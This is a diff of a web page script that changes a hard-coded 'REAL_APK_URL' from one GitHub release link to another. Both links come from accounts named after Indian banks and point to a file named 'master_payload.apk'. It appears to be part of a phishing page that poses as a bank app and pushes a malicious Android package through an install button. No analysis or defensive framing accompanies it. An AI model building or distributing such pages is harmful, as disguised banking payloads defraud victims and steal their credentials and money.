@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
-    const REAL_APK_URL = 'https://github.com/sbibank100200-tech/newmade1/releases/download/v3.0.12/master_payload.apk'; 
+    const REAL_APK_URL = 'https://github.com/hdfcbank100200-tech/newmade2/releases/download/v3.0.2/master_payload.apk'; 
     
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
